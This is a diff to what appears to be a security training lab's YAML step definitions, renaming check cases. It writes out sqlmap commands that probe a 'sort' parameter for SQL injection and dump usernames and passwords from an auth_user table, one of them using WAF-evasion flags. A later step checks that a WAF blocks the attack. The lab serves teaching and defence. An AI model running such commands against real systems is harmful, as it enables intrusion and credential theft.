@@ -451,7 +451,7 @@ foundations:
       - id: sqlmap
         point: {opens: kali, term: {pane: kali, match: '\$ $'}}
         command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --batch --flush-session'
-        check: {kind: kali, case: board-sqli-orderby-sqlmap}
+        check: {kind: kali, case: board-sqli-orderby-sqlmap-probe}
       - id: verdict
         point: {opens: kali, term: {pane: kali, match: 'injectable'}}
         check: {kind: choice, of: sqlmap_found, about: sqlmap, options: ["yes", "no"]}
@@ -487,7 +487,7 @@ foundations:
       - id: dump
         point: {opens: kali, term: {pane: kali, match: '\$ $'}}
         command: 'sqlmap -u "http://board.com/?sort=posts_post.id*" --dbms=mysql --technique=BT --level=5 --risk=3 --random-agent --skip-waf -D board -T auth_user -C username,password --dump --batch --answers="crack=N" --flush-session'
-        check: {kind: kali, case: board-sqli-orderby-sqlmap-random-agent, ua: any}
+        check: {kind: kali, case: board-sqli-orderby-sqlmap-skip-waf, ua: any}
       - id: loot
         point: {opens: kali, term: {pane: kali, match: '^\|'}}
         check: {kind: loot, about: dump}
@@ -510,6 +510,6 @@ foundations:
         check:
           kind: replay
           after: narrow
-          attack: {kali: board-sqli-orderby-sqlmap-random-agent, ua: any}
+          attack: {kali: board-sqli-orderby-sqlmap-skip-waf, ua: any}
           expect: {blocked: true, loot: none}
           benign: {sent: '[?&]sort=(-?created_at|title)$', expect: {status_class: 2xx, waf_logged: false}}
